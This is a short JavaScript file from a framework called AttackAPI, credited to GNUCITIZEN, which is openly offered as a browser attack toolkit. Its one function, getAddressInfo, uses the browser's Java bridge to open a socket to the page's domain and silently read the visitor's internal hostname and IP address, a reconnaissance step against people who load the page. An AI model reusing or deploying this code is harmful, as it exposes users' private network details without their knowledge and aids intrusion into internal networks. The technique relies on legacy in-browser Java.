var AttackAPI = {
	version: '0.2',
	author: 'Petko Petkov (architect)',
	homepage: 'http://www.gnucitizen.org',
	contributors: {
		DanielBartlett: {homepage: 'http://f-box.org/~dan/'}
	}};

AttackAPI.Client = {};
AttackAPI.Client.getAddressInfo = function () {
	var hostname = undefined;
	var address = undefined;
	
	try {
		var sock = new java.net.Socket();
		sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
		sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
		hostname = sock.getLocalAddress().getHostName();
		address = sock.getLocalAddress().getHostAddress();	
	} catch (e) {}
	
	return {hostname: hostname, address: address};
};
